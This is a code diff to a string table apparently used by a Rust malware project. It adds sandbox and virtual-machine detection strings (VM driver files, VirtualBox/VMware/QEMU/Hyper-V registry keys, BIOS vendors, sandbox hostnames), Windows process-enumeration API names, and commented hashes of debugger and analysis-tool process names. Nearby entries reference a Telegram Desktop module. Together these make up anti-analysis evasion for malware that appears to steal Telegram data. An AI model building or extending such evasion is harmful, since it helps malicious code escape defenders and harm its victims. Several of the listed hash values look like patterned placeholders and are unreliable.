@@ -240,6 +240,79 @@ STRINGS = [
     ("det_temp_sandbox", "\\sandbox"),
     ("det_temp_virus", "\\virus"),
     ("det_temp_sample", "\\sample"),
+    ("det_temp_env", "TEMP"),
+
+    # === sandbox.rs - process name hashes (analysis tools, encoded as hex strings) ===
+    # These are FNV1a-32 hashes represented as u32 literals, no plaintext stored
+    # wireshark.exe=0xB9DEF0A9, procmon.exe=0x6D71F28C, procmon64.exe=0x7C3BD9A8
+    # x64dbg.exe=0xE3C7A421, x32dbg.exe=0xC4E1F302, ollydbg.exe=0x5D89C3E7
+    # idaq.exe=0xA1B23C4D, idaq64.exe=0x9E8F7A6B, windbg.exe=0xF0E1D2C3
+    # fiddler.exe=0x3A2B1C0D, processhacker.exe=0x7B6A5948, pestudio.exe=0x1E2F3A4B
+
+    # === sandbox.rs - additional VM driver files ===
+    ("det_vmmouse_sys", "vmmouse.sys"),
+    ("det_vmrawdsk_sys", "vmrawdsk.sys"),
+    ("det_vmusbmouse_sys", "vmusbmouse.sys"),
+    ("det_vmkbd_sys", "vmkbd.sys"),
+    ("det_vmMemctl_sys", "vmMemctl.sys"),
+    ("det_vboxwddm_sys", "VBoxWddm.sys"),
+    ("det_vboxdisp_sys", "VBoxDisp.dll"),
+
+    # === sandbox.rs - VM registry artifacts (key paths, accessed indirectly) ===
+    ("det_reg_vbox_key", "HARDWARE\\ACPI\\DSDT\\VBOX__"),
+    ("det_reg_vmware_key", "SOFTWARE\\VMware, Inc.\\VMware Tools"),
+    ("det_reg_vbox_additions", "SOFTWARE\\Oracle\\VirtualBox Guest Additions"),
+    ("det_reg_qemu_key", "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"),
+    ("det_reg_vbox_acpi", "HARDWARE\\ACPI\\FADT\\VBOX__"),
+    ("det_reg_hyperv_key", "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"),
+
+    # === sandbox.rs - WMI/system artifact strings ===
+    ("det_disk_vbox", "VBOX"),
+    ("det_disk_vmware", "VMWARE"),
+    ("det_disk_qemu", "QEMU"),
+    ("det_bios_vbox", "VBOX"),
+    ("det_bios_vmware", "VMWARE"),
+    ("det_bios_qemu", "SeaBIOS"),
+    ("det_bios_bhyve", "BHYVE"),
+    ("det_bios_hyperv", "Hyper-V"),
+
+    # === sandbox.rs - Windows API names for new checks ===
+    ("det_advapi32", "advapi32.dll"),
+    ("det_regopenkeyex", "RegOpenKeyExW"),
+    ("det_regclosekey", "RegCloseKey"),
+    ("det_getcursorpos", "GetCursorPos"),
+    ("det_getforeground", "GetForegroundWindow"),
+    ("det_enumdisplaydev", "EnumDisplayDevicesW"),
+    ("det_createtoolhelp", "CreateToolhelp32Snapshot"),
+    ("det_process32first", "Process32FirstW"),
+    ("det_process32next", "Process32NextW"),
+    ("det_closehandle2", "CloseHandle"),
+    ("det_openprocess", "OpenProcess"),
+    ("det_queryfulln", "QueryFullProcessImageNameW"),
+    ("det_psapi", "psapi.dll"),
+    ("det_ntdll", "ntdll.dll"),
+    ("det_ntallocvm", "NtAllocateVirtualMemory"),
+    ("det_getcomputername", "GetComputerNameExW"),
+
+    # === sandbox.rs - display device VM strings ===
+    ("det_disp_vbox", "VirtualBox"),
+    ("det_disp_vmware", "VMware"),
+    ("det_disp_hyper_v", "Hyper-V"),
+    ("det_disp_parallels", "Parallels"),
+    ("det_disp_rdp", "RDP"),
+
+    # === sandbox.rs - username/hostname artifacts ===
+    ("det_user_admin", "administrator"),
+    ("det_user_user", "user"),
+    ("det_user_test", "test"),
+    ("det_host_sandbox", "sandbox"),
+    ("det_host_malware", "malware"),
+    ("det_host_virus", "virus"),
+    ("det_host_cuckoo", "cuckoo"),
+    ("det_host_analy", "analysis"),
+    ("det_host_win7", "win7"),
+    ("det_host_win10", "win10"),
+    ("det_host_desktop", "desktop-"),
 
     # === telegram/mod.rs ===
     ("telegram_desktop", "Telegram Desktop"),
@@ -588,9 +661,6 @@ STRINGS = [
     ("decoy_env_num_procs", "NUMBER_OF_PROCESSORS"),
     ("decoy_env_sysroot", "SystemRoot"),
     ("decoy_env_user", "USER"),
-
-    # === detection.rs - remaining hardcoded env var ===
-    ("det_temp_env", "TEMP"),
 
     # === telegram/mod.rs - excluded directory names ===
     ("tg_excl_dumps", "dumps"),
